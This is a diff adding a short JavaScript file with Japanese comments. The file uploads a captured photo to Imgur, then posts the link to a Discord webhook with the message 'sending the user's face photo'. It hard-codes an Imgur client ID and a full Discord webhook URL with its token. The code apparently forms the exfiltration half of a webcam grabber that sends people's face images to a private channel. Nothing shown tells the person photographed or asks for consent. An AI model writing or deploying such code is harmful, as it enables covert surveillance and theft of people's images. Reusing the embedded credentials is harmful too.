@@ -1,0 +1,61 @@
+const clientId = '30b0608b109e465'; // ここにImgurのClient IDを追加
+
+// 写真を撮った後にImgurにアップロード
+function uploadToImgur(base64Image) {
+    fetch('https://api.imgur.com/3/image', {
+        method: 'POST',
+        headers: {
+            'Authorization': `Client-ID ${clientId}`,
+        },
+        body: new URLSearchParams({
+            image: base64Image.split(',')[1] // Base64から余分な部分を除去
+        })
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.success) {
+            const imgurUrl = data.data.link;
+            sendToDiscord(imgurUrl);
+        } else {
+            console.error('Imgurへのアップロードに失敗しました。');
+        }
+    })
+    .catch(error => {
+        console.error('エラーが発生しました:', error);
+    });
+}
+
+// Discordに送信
+function sendToDiscord(imgurUrl) {
+    const webhookURL = 'https://discord.com/api/webhooks/1366016639841341481/L5I7WDD_xthFEHSPfnl9gHAkGpQUGbf542K2whGCHhqDJE2t5PVJeN8Jr4Hx-YDWI0Yt'; // ここにDiscordのWebhook URLを追加
+
+    const payload = {
+        content: 'ユーザーの顔写真を送信します。',
+        embeds: [
+            {
+                title: '顔写真',
+                image: {
+                    url: imgurUrl
+                }
+            }
+        ]
+    };
+
+    fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(payload),
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log('Webhookに送信されました！');
+        } else {
+            console.error('Webhook送信に失敗しました。');
+        }
+    })
+    .catch(error => {
+        console.error('エラーが発生しました:', error);
+    });
+}
